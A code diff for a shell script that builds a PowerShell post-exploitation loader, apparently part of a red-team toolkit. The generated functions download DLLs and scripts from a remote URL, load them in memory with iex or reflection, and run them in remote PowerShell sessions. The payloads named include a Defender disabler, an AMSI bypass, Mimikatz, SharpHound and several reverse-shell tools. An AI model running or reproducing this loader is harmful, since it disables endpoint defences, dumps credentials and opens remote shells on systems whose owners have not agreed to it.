@@ -30,21 +30,55 @@ deploy() {
     case "$path" in
         *".dll")
             cat <<EOF
-function Deploy-${name}DLL {
-    return [System.Reflection.Assembly]::Load(
-        (
-            iwr -DisableKeepAlive -UseBasicParsing $url/$path
-        ).content
+function Get-${name}DLL {
+    Import-Module -Assembly (
+        [System.Reflection.Assembly]::Load(
+            (
+                iwr -DisableKeepAlive -UseBasicParsing $url/$path
+            ).content
+        )
     )
+}
+
+function Deploy-${name}DLL {
+    Param
+    (
+        [Parameter(Position = 0)]
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.Runspaces.PSSession]
+        \$sess
+    )
+
+    Invoke-Command -ScriptBlock (
+        [scriptblock]::Create(
+            (Get-Command Invoke-${name}DLL).definition
+        )
+    ) -Session \$sess
 }
 EOF
             ;;
         *".ps1")
             cat <<EOF
-function Deploy-$name {
-    return [System.Text.Encoding]::ASCII.GetString(
+function Get-$name {
+    [System.Text.Encoding]::ASCII.GetString(
         (iwr -DisableKeepAlive -UseBasicParsing $url/$path).content
     )
+}
+
+function Deploy-$name {
+    Param
+    (
+        [Parameter(Position = 0)]
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.Runspaces.PSSession]
+        \$sess
+    )
+
+    Invoke-Command -ScriptBlock (
+        [scriptblock]::Create(
+            "iex (" + \$((Get-Command Get-$name).definition) + ")"
+        )
+    ) -Session \$sess
 }
 EOF
             ;;
@@ -129,15 +163,11 @@ if (($languagemode -match "constrained")) {
     return
 }
 
-$(deploy "DefenderDisabler" scripts/DefenderDisabler.ps1)
-$(deploy "AMSIBypass" scripts/AMSIBypass.ps1)
-
-iex (Deploy-DefenderDisabler)
-iex (Deploy-AMSIBypass)
-
 $(deploy "ADModule" $admodule_dll)
+$(deploy "AMSIBypass" scripts/AMSIBypass.ps1)
 $(deploy "BloodHound" tools/BloodHound/Ingestors/SharpHound.ps1)
 $(deploy "ConPtyShell" tools/ConPtyShell/Invoke-ConPtyShell.ps1)
+$(deploy "DefenderDisabler" scripts/DefenderDisabler.ps1)
 $(deploy "Mimikatz" tools/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
 $(deploy "PowerCat" tools/powercat/powercat.ps1)
 $(deploy "PowerShellTcp" tools/nishang/Shells/Invoke-PowerShellTcp.ps1)
